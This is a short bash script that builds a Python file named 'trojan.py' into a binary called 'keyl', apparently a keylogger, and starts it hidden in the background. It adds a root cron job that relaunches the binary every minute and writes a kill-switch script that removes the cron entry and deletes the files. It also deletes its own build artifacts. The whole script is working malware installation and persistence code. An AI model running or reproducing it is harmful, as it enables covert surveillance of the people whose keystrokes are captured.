#!/bin/bash

# launch.sh
cat << 'EOF' > /tmp/launch.sh
#!/bin/bash
if ! pgrep -f "/tmp/keyl" > /dev/null; then
    nohup /tmp/keyl &> /dev/null &
fi
EOF
chmod +x /tmp/launch.sh

# killSwitch.sh
cat << 'EOF' > /tmp/killSwitch.sh
#!/bin/bash

#crontab cleaner
crontab -l -u root > /tmp/root_crontab.bak 2>/dev/null
grep -v 'launch.sh' /tmp/root_crontab.bak > /tmp/root_crontab.new
crontab -u root /tmp/root_crontab.new
rm /tmp/root_crontab.bak /tmp/root_crontab.new

#files deleting
rm -f /tmp/keyl /tmp/launch.sh /tmp/killSwitch.sh
EOF
chmod +x /tmp/killSwitch.sh

# add launch to the cronjob
echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -

#keyl
#momentaneo!! :

pyinstaller --onefile --name keyl /home/kali/Desktop/trojan/trojan.py
mv /home/kali/Desktop/trojan/dist/keyl /tmp/keyl

rm /home/kali/Desktop/trojan/keyl.spec
rm -R /home/kali/Desktop/trojan/build
rm -R /home/kali/Desktop/trojan/dist

nohup /tmp/keyl &> /dev/null &
